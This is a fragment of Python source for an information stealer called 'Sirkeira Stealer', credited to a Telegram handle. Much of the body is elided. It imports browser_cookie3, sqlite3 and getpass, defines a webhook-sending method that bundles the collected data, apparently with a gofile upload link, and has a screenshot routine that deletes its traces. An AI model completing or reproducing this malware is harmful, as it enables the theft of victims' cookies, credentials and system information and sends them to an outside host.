import shutil, requests, platform, socket, getpass, psutil, browser_cookie3, os, re, sys, subprocess, ctypes, json, base64, sqlite3, zipfile, random, time
...
class Loaded_2025:
    def __init__(self):
        ...
        self.loaded_2025_name = "Sirkeira Stealer"
        self.loaded_2025_author = "https://t.me/CirqueiraDev"
    ...
    def send_webhook(self, gofile_url=None, file_path=None):
        try:
            ...
            payload = {
                "username": self.loaded_2025_name,
                "embeds": [embed],
...
{IPinfos}
    ...
    def Screenshot(zip_file):
        ...
        if os.path.exists(screenshot_image_path):
            Loaded_2025().delete_file(screenshot_image_path)
            return True
        else:
            return False
